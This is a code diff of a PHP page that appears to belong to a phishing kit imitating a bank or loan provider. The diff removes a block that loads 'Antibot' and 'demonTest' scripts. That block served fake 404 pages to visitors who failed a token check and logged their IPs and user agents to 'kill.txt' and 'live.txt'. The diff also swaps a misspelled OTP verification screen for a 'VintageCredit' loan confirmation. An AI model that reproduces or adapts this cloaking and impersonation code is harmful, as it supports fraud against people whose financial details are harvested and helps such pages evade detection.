@@ -6,31 +6,6 @@
     require_once '../Meta/Antibot.php';
     require_once '../Meta/demonTest.php';
 
-    $comps = new Comp;
-    $antibot = new Antibot;
-
-    $settings = $comps->settings();
-
-    if (!$comps->checkToken()) {
-        echo $antibot->throw404();
-        $comps->log(
-            "../Guard/Audio/kill.txt",
-            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
-        );
-        die();
-    }
-
-    if (
-        !isset($_SESSION['visitor']) ||
-        !$_SESSION['visitor']
-    ) {
-        $comps->log(
-            "../Guard/Audio/live.txt",
-            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: Visitor\n\n"
-        );
-        $_SESSION['visitor'] = 1;
-    }
-
 ?>
 <!doctype html>
 <html class="no-js" lang="en">
@@ -87,9 +62,9 @@
                     <div class="col-lg-8">
                         <div class="form-content">
                             <div class="section-header">
-                                <h5 class="sub-title">Give yourself the Bankio Edge</h5>
-                                <h2 class="title">Varified Your Phone Number</h2>
-                                <p>A 6 digit One Time Password (OTP) has been sent to your given email address which will expire in 15 minutes, after which you will need to resend the code.</p>
+                                <h5 class="sub-title">Give yourself the VintageCredit Edge</h5>
+                                <h2 class="title">Congratulations</h2>
+                                <p>Your loan application has been received. A confirmation email has been sent to your email address. Thank you for trusting us with your financial needs.</p>
                             </div>
                             <div class="btn-back mt-60 d-flex align-items-center">
                                 <a href="../../index.html" class="back-arrow"><img src="../../assets/images/icon/arrow-left.png"
